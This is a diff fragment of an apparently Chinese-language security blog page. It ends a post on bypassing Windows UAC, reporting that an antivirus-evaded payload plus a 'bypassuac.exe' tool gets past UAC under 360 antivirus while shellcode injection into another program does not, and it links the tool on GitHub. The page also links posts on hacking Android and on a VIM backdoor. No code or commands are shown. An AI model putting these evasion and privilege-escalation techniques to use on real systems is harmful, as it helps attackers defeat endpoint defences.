+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640-16355982259099" alt="图片"></p>
+<p>再看一下360，这里我试了两个方法，第一种方法是直接对<code>artifact.exe</code>做一下免杀，然后执行<code>bypassuac.exe</code>可以正常上线并bypassuac，但是如果使用注入shellcode到其他的exe就不能够获得uac权限</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640-163559822590910" alt="图片"></p>
+<p>如图所示，这里我思考了一下，因为如果注入shellcode到其他程序，注册表指向的还是这个注入shellcode到其他程序的exe，所以后面那种方法是不能够bypassuac的</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640.webp" alt="图片"></p>
+<p>工具已经打包至github：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Drunkmars/BypassUAC">https://github.com/Drunkmars/BypassUAC</a></p>
 
       </section>
 
@@ -281,8 +275,8 @@
     
     <div class="card-text">
       
-        <a href="/2021/10/13/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">入侵安卓</h2>
+        <a href="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">穿越边界的姿势</h2>
         </a>
       
       <div class="card-text--row">Newer</div>
@@ -296,8 +290,8 @@
     
     <div class="card-text">
       
-        <a href="/2021/10/13/%E5%9B%BD%E5%A4%96%E8%8C%83%E5%9B%B4%E6%80%A7shell%E8%8E%B7%E5%8F%96/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">国外范围性shell获取</h2>
+        <a href="/2021/10/27/VIM%E5%90%8E%E9%97%A8/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">VIM后门</h2>
         </a>
       
       <div class="card-text--row">Older</div>
